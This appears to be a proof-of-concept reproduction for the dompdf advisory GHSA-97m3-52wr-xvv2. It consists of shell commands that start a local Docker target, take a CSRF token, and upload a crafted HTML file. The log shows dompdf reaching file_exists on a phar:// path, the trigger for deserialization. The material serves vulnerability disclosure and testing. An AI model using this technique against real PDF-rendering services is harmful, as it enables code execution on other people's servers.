### Pdf rendering from malicious html file [GHSA_97m3_52wr_xvv2][1]

```bash
$ docker build --tag host.GHSA_97m3 --file Dockerfile .
$ docker run -p 8002:8000 -d -t --name GHSA_97m3 host.GHSA_97m3
$ Set-Variable -Name X -Value (curl.exe -c cookiejar -X GET http://127.0.0.1:8002/token)
$ echo $X
kCnrA9SNT7GtFW1jvUQAm3Om9NsmECs487Zd8hhD # <--- good !
$ curl.exe -b cookiejar --header "X-CSRF-TOKEN:$X" -X POST http://127.0.0.1:8002/test
999 666 MMM # <--- good !
$ curl.exe -b cookiejar --header "X-CSRF-TOKEN:$X" -F "source=@example.html" -X POST http://127.0.0.1:8002/ghsa_97m3
>>> calling file_exists(/frontend/vendor/dompdf/dompdf/lib/fonts/Times-Roman.afm)
>>> calling file_exists(./Times-Roman.afm)
>>> calling file_exists(phar://baz.phar/test.ufm) # <--- a call to file_exists with phar file - good !
>>> calling file_exists(phar://baz.phar/test.ufm) # <--- a call to file_exists with phar file - good !
Unable to stream pdf: headers already sent
```

[1]: https://github.com/advisories/GHSA-97m3-52wr-xvv2